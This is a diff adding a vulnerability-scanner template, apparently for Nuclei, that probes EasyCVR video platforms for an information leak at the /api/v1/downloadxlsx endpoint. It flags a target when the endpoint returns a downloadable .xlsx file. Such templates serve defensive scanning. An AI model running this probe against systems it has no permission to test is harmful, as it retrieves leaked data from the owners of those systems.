@@ -1,0 +1,28 @@
+id: poc-easycvr-downloadxlsx-info-leak
+info:
+  name: EasyCVR Video Management Platform downloadxlsx Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak,easycvr
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/downloadxlsx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: regex
+        part: header
+        regex:
+          - "filename=([0-9a-zA-Z_]+).xlsx"
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "<html"
